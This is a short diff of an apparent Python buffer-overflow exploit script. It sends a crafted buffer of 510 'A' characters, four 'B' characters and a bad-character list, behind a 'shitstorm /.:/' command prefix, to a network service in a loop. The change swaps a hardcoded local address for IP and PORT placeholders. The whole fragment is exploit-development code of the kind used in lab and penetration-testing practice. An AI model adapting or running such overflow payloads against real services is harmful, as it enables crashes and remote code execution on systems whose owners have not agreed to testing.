@@ -18,7 +18,7 @@ buffer = "A" * 510 + "B" * 4 + badchars
 while True:
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(('127.0.0.2', 5000))
+        sock.connect(('IP', PORT))
         payload = b'shitstorm /.:/' + buffer
         sock.send(payload)
         sock.close()
